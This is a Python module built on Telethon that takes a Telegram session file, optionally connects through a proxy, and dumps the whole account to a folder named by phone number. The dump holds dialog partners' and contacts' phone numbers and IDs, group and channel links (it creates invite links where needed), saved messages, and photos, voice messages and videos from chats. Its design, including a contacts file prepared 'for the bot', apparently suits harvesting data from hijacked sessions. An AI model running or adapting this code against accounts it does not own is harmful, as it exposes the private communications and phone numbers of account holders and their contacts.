from __future__ import annotations

import os
from datetime import datetime
from typing import Optional

from telethon import TelegramClient, functions
from telethon.tl.types import Channel, Chat, User

from app.credentials import TelegramCredentials
from web.services.export_options import ExportOptions
from web.services.flood import call_with_flood_wait
from web.services.proxy import ProxySettings


class ClientFactory:
	@staticmethod
	def create(
		session_path: str,
		proxy: Optional[ProxySettings] = None,
	) -> TelegramClient:
		base = session_path[:-8] if session_path.endswith(".session") else session_path
		kwargs = TelegramCredentials.client_kwargs()
		if proxy:
			kwargs["proxy"] = proxy.to_telethon()
		return TelegramClient(base, **kwargs)


class AccountExporter:
	"""Выгрузка: диалоги → контакты → чаты/каналы; плюс медиа."""

	DUMPS_DIR = "dumps"
	PEOPLE_FILE = "people.txt"

	def __init__(self, options: Optional[ExportOptions] = None) -> None:
		self.options = options or ExportOptions()

	async def export_from_session(
		self,
		session_path: str,
		proxy: Optional[ProxySettings] = None,
	) -> str:
		client = ClientFactory.create(session_path, proxy=proxy)
		await client.connect()
		try:
			if not await client.is_user_authorized():
				raise RuntimeError("Сессия не авторизована")
			return await self.export_from_client(client)
		finally:
			await client.disconnect()

	async def export_from_client(self, client: TelegramClient) -> str:
		me = await client.get_me()
		stamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
		phone = me.phone or str(me.id)
		folder = os.path.join(self.DUMPS_DIR, f"{phone}_{stamp}")
		os.makedirs(folder, exist_ok=True)

		await self._write_info(me, folder)
		private_dialogs = await self._write_people_file(client, folder)

		if self.options.dump_avatar:
			await self._download_avatar(client, folder)

		if self.options.dump_saved_messages:
			await self._write_saved_messages(client, folder)

		if self._need_media():
			await self._download_media(client, folder, private_dialogs)

		return folder

	def _need_media(self) -> bool:
		return self.options.dump_photo or self.options.dump_voice or self.options.dump_video

	async def _write_info(self, me, folder: str) -> None:
		path = os.path.join(folder, "info.txt")
		lines = [
			f"Date: {datetime.now().isoformat(timespec='seconds')}",
			f"ID: {me.id}",
			f"Username: @{me.username}" if me.username else "Username: -",
			f"Name: {me.first_name or ''} {me.last_name or ''}".strip(),
			f"Phone: +{me.phone}" if me.phone else "Phone: -",
			f"Premium: {getattr(me, 'premium', False)}",
		]
		with open(path, "w", encoding="utf-8") as file:
			file.write("\n".join(lines) + "\n")

	async def _write_people_file(self, client: TelegramClient, folder: str) -> list:
		"""
		Один файл:
		1) диалоги с кем общаюсь
		2) все контакты
		3) чаты/каналы внизу
		"""
		dialog_blocks = []
		group_blocks = []
		channel_blocks = []
		private_dialogs = []

		async for dialog in client.iter_dialogs():
			entity = dialog.entity

			if isinstance(entity, User):
				if getattr(entity, "bot", False) or getattr(entity, "is_self", False):
					continue
				dialog_blocks.append(self._format_person(entity, with_link=True))
				private_dialogs.append(dialog)
				continue

			title = dialog.name or "-"
			link = await self._resolve_link(client, entity)
			block = f"название: {title}\nссылка: {link}"

			if isinstance(entity, Chat):
				group_blocks.append(block)
			elif isinstance(entity, Channel):
				if entity.broadcast:
					channel_blocks.append(block)
				else:
					group_blocks.append(block)

		contacts_result = await call_with_flood_wait(
			lambda: client(functions.contacts.GetContactsRequest(hash=0))
		)
		contact_blocks = [
			self._format_person(user, with_link=False)
			for user in contacts_result.users
			if not getattr(user, "bot", False)
		]

		parts = [
			"=== ДИАЛОГИ (с кем общаюсь) ===",
			f"Всего: {len(dialog_blocks)}",
			"",
			("\n\n".join(dialog_blocks) if dialog_blocks else "-"),
			"",
			"=== КОНТАКТЫ ===",
			f"Всего: {len(contact_blocks)}",
			"",
			("\n\n".join(contact_blocks) if contact_blocks else "-"),
			"",
			"=== ЧАТЫ / КАНАЛЫ ===",
			"",
			f"--- Группы: {len(group_blocks)} ---",
			("\n\n".join(group_blocks) if group_blocks else "-"),
			"",
			f"--- Каналы: {len(channel_blocks)} ---",
			("\n\n".join(channel_blocks) if channel_blocks else "-"),
			"",
		]

		path = os.path.join(folder, self.PEOPLE_FILE)
		with open(path, "w", encoding="utf-8") as file:
			file.write("\n".join(parts))

		# дублируем контакты отдельным коротким файлом для бота при необходимости
		contacts_only = os.path.join(folder, "contacts.txt")
		with open(contacts_only, "w", encoding="utf-8") as file:
			file.write(f"Контакты: {len(contact_blocks)}\n\n")
			file.write("\n\n".join(contact_blocks) if contact_blocks else "-")
			file.write("\n")

		return private_dialogs

	@staticmethod
	def _format_person(user, with_link: bool = False) -> str:
		name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "-"
		username = f"@{user.username}" if user.username else "-"
		phone = f"+{user.phone}" if user.phone else "-"
		lines = [
			f"номер: {phone}",
			f"имя: {name}",
			f"user: {username}",
			f"id: {user.id}",
		]
		if with_link:
			if user.username:
				lines.append(f"ссылка: https://t.me/{user.username}")
			else:
				lines.append(f"ссылка: tg://user?id={user.id}")
		return "\n".join(lines)

	async def _write_saved_messages(self, client: TelegramClient, folder: str) -> None:
		path = os.path.join(folder, "saved_messages.txt")
		messages = []
		async for message in client.iter_messages("me"):
			if message.text:
				messages.append(message.text)
		with open(path, "w", encoding="utf-8") as file:
			file.write("\n\n".join(messages))

	async def _download_avatar(self, client: TelegramClient, folder: str) -> None:
		try:
			await call_with_flood_wait(
				lambda: client.download_profile_photo("me", os.path.join(folder, "ava"))
			)
		except Exception:
			pass

	async def _download_media(self, client: TelegramClient, folder: str, private_dialogs: list) -> None:
		photos_dir = os.path.join(folder, "photos")
		voices_dir = os.path.join(folder, "voice_messages")
		videos_dir = os.path.join(folder, "videos")

		if self.options.dump_photo:
			os.makedirs(photos_dir, exist_ok=True)
		if self.options.dump_voice:
			os.makedirs(voices_dir, exist_ok=True)
		if self.options.dump_video:
			os.makedirs(videos_dir, exist_ok=True)

		max_bytes = int(self.options.max_video_mb * 1000 * 1000)
		stats = {"photos": 0, "voices": 0, "videos": 0}

		dialogs = private_dialogs
		if not self.options.only_private_chats_media:
			dialogs = [d async for d in client.iter_dialogs()]

		for dialog in dialogs:
			entity = dialog.entity
			if isinstance(entity, User) and getattr(entity, "bot", False):
				continue

			async for message in client.iter_messages(entity):
				try:
					if message.photo and self.options.dump_photo:
						await call_with_flood_wait(
							lambda m=message: m.download_media(photos_dir)
						)
						stats["photos"] += 1

					document = message.document
					if not document:
						continue

					mime = getattr(document, "mime_type", "") or ""
					size = getattr(document, "size", 0) or 0

					if mime == "audio/ogg" and self.options.dump_voice:
						await call_with_flood_wait(
							lambda m=message: m.download_media(voices_dir)
						)
						stats["voices"] += 1
					elif mime == "video/mp4" and self.options.dump_video and size <= max_bytes:
						await call_with_flood_wait(
							lambda m=message: m.download_media(videos_dir)
						)
						stats["videos"] += 1
				except Exception:
					continue

		with open(os.path.join(folder, "media_stats.txt"), "w", encoding="utf-8") as file:
			file.write(
				"\n".join(
					[
						f"photos: {stats['photos']}",
						f"voices: {stats['voices']}",
						f"videos: {stats['videos']}",
						f"max_video_mb: {self.options.max_video_mb}",
					]
				)
				+ "\n"
			)

	async def _resolve_link(self, client: TelegramClient, entity) -> str:
		username = getattr(entity, "username", None)
		if username:
			return f"https://t.me/{username}"

		if isinstance(entity, User):
			return f"tg://user?id={entity.id}"

		try:
			if isinstance(entity, Channel):
				result = await call_with_flood_wait(
					lambda: client(functions.messages.ExportChatInviteRequest(peer=entity))
				)
				link = getattr(result, "link", None)
				if link:
					return link
		except Exception:
			pass

		return f"id:{getattr(entity, 'id', '-')}"
